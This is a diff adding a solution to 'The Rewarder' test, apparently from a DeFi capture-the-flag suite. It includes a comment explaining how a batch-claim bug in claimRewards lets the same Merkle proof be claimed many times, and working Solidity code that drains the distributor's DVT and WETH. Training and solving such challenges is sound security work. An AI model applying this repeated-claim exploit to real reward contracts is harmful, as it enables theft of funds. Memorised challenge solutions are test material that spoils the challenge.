@@ -30,10 +30,12 @@ contract TheRewarderChallenge is Test {
     // Distribution data for Damn Valuable Token (DVT)
     DamnValuableToken dvt;
     bytes32 dvtRoot;
+    bytes32[] dvtLeaves;
 
     // Distribution data for WETH
     WETH weth;
     bytes32 wethRoot;
+    bytes32[] wethLeaves;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -54,8 +56,8 @@ contract TheRewarderChallenge is Test {
         weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();
 
         // Calculate roots for DVT and WETH distributions
-        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
-        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         merkle = new Merkle();
         dvtRoot = merkle.getRoot(dvtLeaves);
         wethRoot = merkle.getRoot(wethLeaves);
@@ -148,7 +150,76 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        /**
+         * VULNERABILITY EXPLANATION:
+         * The claimRewards function has a critical bug in its batch processing logic:
+         * 1. Token transfers happen for EVERY claim in the loop
+         * 2. But _setClaimed (which marks claims as used) only runs when token changes or on last claim
+         * 3. This means we can submit the same valid claim multiple times and get multiple transfers
+         *
+         * The accumulated amount is subtracted from 'remaining' but each individual transfer
+         * still goes through, allowing us to drain way more than our entitled amount.
+         *
+         * EXPLOIT STRATEGY:
+         * 1. Find player's merkle proof for both DVT and WETH distributions
+         * 2. Calculate how many times we can claim without underflowing 'remaining'
+         * 3. Submit repeated claims - each iteration transfers tokens to us
+         * 4. Transfer all tokens to recovery
+         */
+
+        // Player is at index 188 in both distributions
+        uint256 PLAYER_INDEX = 188;
+        uint256 PLAYER_DVT_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_AMOUNT = 1171088749244340;
+
+        // Calculate remaining amounts after Alice's claim
+        uint256 dvtRemaining = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
+        uint256 wethRemaining = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
+
+        // Calculate how many times we can claim each token
+        uint256 dvtClaims = dvtRemaining / PLAYER_DVT_AMOUNT;
+        uint256 wethClaims = wethRemaining / PLAYER_WETH_AMOUNT;
+
+        // Get merkle proofs
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, PLAYER_INDEX);
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, PLAYER_INDEX);
+
+        // Build claims array - all DVT claims first, then all WETH claims
+        // This way _setClaimed is called once per token (when token changes and on last)
+        uint256 totalClaims = dvtClaims + wethClaims;
+        Claim[] memory claims = new Claim[](totalClaims);
         
+        // DVT claims (tokenIndex = 0)
+        for (uint256 i = 0; i < dvtClaims; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_DVT_AMOUNT,
+                tokenIndex: 0,
+                proof: dvtProof
+            });
+        }
+        
+        // WETH claims (tokenIndex = 1)
+        for (uint256 i = 0; i < wethClaims; i++) {
+            claims[dvtClaims + i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_WETH_AMOUNT,
+                tokenIndex: 1,
+                proof: wethProof
+            });
+        }
+
+        // Setup tokens array
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = IERC20(address(dvt));
+        tokens[1] = IERC20(address(weth));
+
+        // Execute the exploit - this drains most of the funds
+        distributor.claimRewards(claims, tokens);
+
+        // Transfer all tokens to recovery
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
